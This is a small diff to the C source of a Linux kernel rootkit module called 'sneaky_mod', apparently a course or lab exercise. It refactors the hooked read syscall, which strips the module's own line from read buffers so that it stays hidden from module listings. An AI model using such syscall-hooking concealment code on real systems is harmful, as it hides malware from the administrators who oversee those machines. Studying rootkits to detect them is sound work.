@@ -100,7 +100,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
 }
 
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
-  char *line_start = NULL, *line_end = NULL, *buf = regs->si;
+  char *buf = regs->si;
   ssize_t nread = original_read(regs);
 
    if(nread == -1){
@@ -110,9 +110,9 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs){
     return 0;
   }
   else{
-    line_start = strstr(buf, "sneaky_mod ");
+    char * line_start = strstr(buf, "sneaky_mod ");
     if (line_start != NULL) {
-      line_end = strchr(line_start, '\n');
+      char * line_end = strchr(line_start, '\n');
       if(line_end !=NULL){
         line_end++;
         memmove(line_start, line_end, (char __user*)(buf + nread) - line_end);
